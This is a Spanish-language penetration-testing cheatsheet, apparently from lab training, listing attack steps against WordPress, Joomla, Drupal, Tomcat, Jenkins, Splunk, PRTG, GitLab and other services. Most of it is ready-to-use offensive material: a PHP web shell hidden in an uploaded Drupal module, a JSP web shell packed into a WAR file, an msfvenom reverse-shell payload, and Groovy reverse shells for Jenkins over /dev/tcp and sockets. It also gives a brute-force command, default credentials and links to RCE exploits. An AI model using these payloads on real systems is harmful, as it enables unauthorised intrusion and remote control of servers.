# Cheatsheet ⚙

## Enumeración 👶

| Herramientas |
| --- | 
| **Nmap:** `nmap -p- --open -oX scan -iL [scopes].txt` |
| **Eyewitness:** `eyewitness --web -x scan.xml -d [Output Directory]` |
| **Aquatone** `cat scan.xml \| aquatone -nmap` | 

## WordPress 🛒

| Herramientas |
| --- | 
| **Wpscan:** `wpscan --url [Dominio] [Opciones]` |
| **Directorios:** `/wp-includes/` `/wp-admin/` `/wp-content/[plugins \| themes]` `readme.txt` |

## Joomla 🏫
| Herramienta | Uso |
| --- |:-----:|
| **Droopescan** | `droopescan scam joomla --url [Domain]` |
| **Directorios** |`/README.txt` `media/system/js/` `/administrator/manifests/files/joomla.xm` `/plugins/system/cache/cache.xml` |
| **[joomscan](https://github.com/OWASP/joomscan)** |  `python2.7 joomlascan.py -u [Domain]` |
| **[joomlabrute-force](https://github.com/ajnik/joomla-bruteforce)** | `python3 joomla-brute.py -u [Dominio] -w [Diccionario] -usr "[Username]"` |

## Drupal 💧
| Herramienta | Uso |
| --- |:-----:|
| **Directorios** | `CHANGELOG.txt` `README.txt` |
| **Droopescan** | `droopescan scam drupal -u [Domain]` |
| **drupalgeddon** | **[drupalgeddon](https://www.exploit-db.com/exploits/34992)** |
| **drupalgeddon 2** | **[drupalgeddon 2](https://www.exploit-db.com/exploits/44448)** |
| **PHP Filter Module** |  `wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz` |

| Subir Módulo Vulnerable |
|:-----------------------:|
| `wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz` |
| `tar xvf captcha-8.x-1.2.tar.gz` |
| **shell.php**: `<?php system($_GET['cmd']);?>` | 
| **.htaccess**: `<IfModule mod_rewrite.c> \n RewriteEngine On \n RewriteBase / \n </IfModule>` |
| `mv shell.php .htaccess captcha` |
| **Comprimido Final:** `tar cvf captcha.tar.gz captcha/` |
| `Subimos el módulo` (Esto varía entre versiones de **Drupal**)


## Tomcat 😼
| Herramienta | Uso |
| --- |:-----:|
| **Directorios** | `/docs/` `/manager` `/host-manager` |
| **.War File** | `wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp` \| `zip -r backup.war cmd.jsp` |
| **msfvenom** | `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war` |


## Jenkins 🤵
| Herramienta | Uso |
| --- |:-----:|
| **Directorios** | `/script` |

| **`Linux` Reverse Shell** |
|:---:|

```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/[IP]/[Port];cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

| **`Windows` Reverse Shell** |
|:---:|

```groovy
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

## Splunk 🔍
| Herramienta | Uso |
| --- |:-----:|
| **Subir Aplicación Maliciosa** | `https://github.com/0xjpuff/reverse_shell_splunk.git` \| `tar -cvzf shell.tar.gz reverse_shell_splunk`  \| `Management` -> `Apps` -> `Install App From File` |

## PRTG Monitor 💻
| Herramienta | Uso |
| --- |:-----:|
| **Credenciales Por Defecto** | `prtgadmin:prtgadmin` |
| **Notifications RCE** | `https://codewatch.org/2018/06/25/prtg-18-2-39-command-injection-vulnerability/` |


## GitLab 🐱‍👤
| Herramienta | Uso |
| --- |:-----:|
| **Version (Authenticated)** | `/help` |
| **Projects** | `/explore`  |
| **User Enumerate** | `https://www.exploit-db.com/exploits/49821`  |
| **RCE (Authenticated)** | `https://www.exploit-db.com/exploits/49951` |

## Tomcat CGI  😾
| Herramienta | Uso |
| --- |:-----:|
| **Directorios** | `/cgi`  \| `/cgi-bin` |
| **RCE** | `http://[Dominio]/cgi/[archivo].bat?&[Command]` |
| **Extensiones de Archivos** | `.pl`-`.cgi`-`.pl`-`.bat`-`.cmd`-`.sh` |
| **ShellShock** | `https://blog.cloudflare.com/inside-shellshock/` |

## Attacking Thick Client Applications

| - | Nombres |
| --- |:-----:|
| **Herramientas** | [CFF Explorer](https://ntcore.com/?page_id=388)  \| [Process Monitor](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon) \| [Strings](https://learn.microsoft.com/en-us/sysinternals/downloads/strings) \| [dnSpy](https://github.com/dnSpy/dnSpy) |

## ColdFusion 🍧🔥

| Herramienta | Uso |
| --- |:-----:|
| **Extensiones de Archivo** | `.cmf`  \| `.cfc` |
| **Directorios** | `/admin.cmf`  \| `/CFIDE/administrator/index.cfm` |


## IIS Tilde Enumeration 🔢
| Herramienta | Uso |
| --- |:-----:|
| **IIS ShortName** | `https://github.com/irsdl/IIS-ShortName-Scanner` |
| **Uso** | `java -jar iis_shortname_scanner.jar 0 5 http://[Dominio]/` |